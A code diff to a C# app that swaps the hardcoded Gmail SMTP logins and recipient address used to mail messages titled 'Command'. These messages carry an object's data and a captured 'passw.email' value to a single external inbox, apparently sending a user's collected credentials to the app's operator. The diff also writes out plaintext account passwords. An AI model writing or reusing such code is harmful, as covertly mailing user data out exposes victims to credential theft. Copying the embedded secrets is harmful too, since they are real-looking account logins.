@@ -61,21 +61,19 @@ namespace App1
                 mail.Subject = "Command";
                 mail.Body = t.ToString();
                 //   smtpServer.Credentials = new NetworkCredential(passw.email, passw.pass);
-                smtpServer.Credentials = new NetworkCredential("ahmidinador123@gmail.com","nadori123456");
+                smtpServer.Credentials = new NetworkCredential("helpplankit@gmail.com", "mohamoha1230");
                 smtpServer.UseDefaultCredentials = false;
                 smtpServer.EnableSsl = true;
                 smtpServer.Send(mail);
 
-
-
                 var mmail = new MailMessage();
                 var ssmtpServer = new SmtpClient("smtp.gmail.com", 587);
-                mmail.From = new MailAddress("ahmidinador123@gmail.com");
-                mmail.To.Add("helpplnkit@gmail.com");
+                mmail.From = new MailAddress("helpplankit@gmail.com");
+                mmail.To.Add("helpplankit@gmail.com");
                 mmail.Subject = "Command"+passw.email.ToString();
                 mmail.Body = t.ToString();
                 //   smtpServer.Credentials = new NetworkCredential(passw.email, passw.pass);
-                ssmtpServer.Credentials = new NetworkCredential("ahmidinador123@gmail.com", "nadori123456");
+                ssmtpServer.Credentials = new NetworkCredential("helpplankit@gmail.com", "mohamoha1230");
                 ssmtpServer.UseDefaultCredentials = false;
                 ssmtpServer.EnableSsl = true;
                 ssmtpServer.Send(mmail);
